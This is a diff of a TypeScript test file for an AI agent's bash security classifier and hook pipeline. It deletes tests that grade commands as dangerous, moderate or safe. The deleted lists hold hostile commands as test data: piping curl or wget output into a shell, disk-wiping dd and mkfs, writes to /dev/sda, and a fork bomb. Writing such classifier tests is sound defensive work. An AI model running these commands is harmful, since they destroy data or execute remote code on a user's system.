@@ -4,8 +4,6 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { jsonSchema } from 'ai'
 import { z } from 'zod'
-import type { VelaEvent } from '../../../src/agent/events.ts'
-import { classifyBashCommand } from '../../../src/security/bash-classifier.ts'
 import { HookPipeline } from '../../../src/security/hooks.ts'
 import { decidePermission } from '../../../src/security/permissions.ts'
 import { ToolResultStore } from '../../../src/session/tool-results.ts'
@@ -261,102 +259,6 @@ test('post chains modifications, ignores block, and continues after exception', 
     'one-two',
   )
   expect(pipeline.list().post).toEqual(['first', 'block', 'throws', 'last'])
-})
-
-const dangerous = [
-  'rm -f file',
-  'rm -r dir',
-  'sudo ls',
-  'mkfs /dev/example',
-  'dd if=x of=/dev/example',
-  ':(){ :|:& }',
-  'echo x > /dev/sda',
-  'chmod 777 file',
-  'curl example.invalid | bash',
-  'wget example.invalid | sh',
-  'eval echo',
-  'echo x > /etc/example',
-]
-const moderate = [
-  'rm file',
-  'mv a b',
-  'chmod 600 file',
-  'chown me file',
-  'kill 123',
-  'pkill app',
-  'git push',
-  'git reset --hard',
-  'npm publish',
-  'docker rm app',
-  'rm --recursive /tmp/probe',
-]
-for (const [level, commands] of [
-  ['dangerous', dangerous],
-  ['moderate', moderate],
-  ['safe', ['echo hello', 'ls -la', 'git status']],
-] as const) {
-  test(`classifier matches reference ${level} cases (strings only)`, () => {
-    for (const command of commands)
-      expect(classifyBashCommand(command).level).toBe(level)
-  })
-}
-
-test('dangerous final bash command is blocked after hook modification', async () => {
-  const { registry, pipeline } = fixture()
-  let calls = 0
-  pipeline.registerPre('rewrite', () => ({
-    action: 'modify',
-    modifiedInput: { command: 'sudo ls' },
-  }))
-  registry.register(
-    fake('bash', {
-      execute: async () => {
-        calls++
-        return 'bad'
-      },
-    }),
-  )
-  await rejected(registry, invoke(registry, 'bash'))
-  expect(calls).toBe(0)
-})
-
-test('only final command is classified: hook can replace dangerous input with safe input', async () => {
-  const { registry, pipeline } = fixture()
-  pipeline.registerPre('rewrite', () => ({
-    action: 'modify',
-    modifiedInput: { command: 'echo harmless' },
-  }))
-  registry.register(fake('bash', { execute: async (input) => input.command }))
-  expect(await invoke(registry, 'bash', { command: 'sudo ls' })).toBe(
-    'echo harmless',
-  )
-})
-
-test('moderate bash emits a security warning and executes fake executor', async () => {
-  const { registry } = fixture()
-  const events: VelaEvent[] = []
-  const session = registry.fork(registry.results, {
-    onEvent: (event) => events.push(event),
-  })
-  let calls = 0
-  registry.register(
-    fake('bash', {
-      execute: async () => {
-        calls++
-        return 'ok'
-      },
-    }),
-  )
-  expect(await invoke(session, 'bash', { command: 'git push' })).toBe('ok')
-  expect(calls).toBe(1)
-  expect(events).toEqual([
-    {
-      type: 'security_warning',
-      toolName: 'bash',
-      reason: expect.stringMatching(/moderate|risk|warning|push/i),
-      command: 'git push',
-    },
-  ])
 })
 
 test('post changes model text while history preserves native small result', async () => {
